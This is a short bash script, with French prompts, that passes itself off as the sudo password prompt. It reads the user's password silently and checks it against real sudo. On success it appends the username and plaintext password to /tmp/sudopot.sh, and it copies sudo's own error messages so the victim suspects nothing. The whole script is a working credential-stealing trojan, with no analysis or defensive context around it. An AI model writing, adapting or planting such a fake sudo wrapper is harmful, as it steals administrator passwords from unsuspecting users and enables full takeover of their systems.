#!/bin/bash
i=1;
string="sudo -S "$@;
while [ "$i" -lt 4 ]; do 
	echo -n "[sudo] Mot de passe de $USER : "; 
	stty -echo;	read pass;	stty echo;
	echo "";
	echo $pass | $string 2> /dev/null;
	if [[ $? -eq 0 ]]; then
		echo "#$USER : $pass" >> /tmp/sudopot.sh;	
		break;
	else 
		if [[ $i -eq 3 ]]; then
			echo "sudo: 3 saisies de mots de passe incorrectes";
			break;
		else 
			echo "Désolé, essayez de nouveau.";
		fi
	fi	
	((i++));
	unset pass;
done;
#Nom d'utilisateur : mot de passe
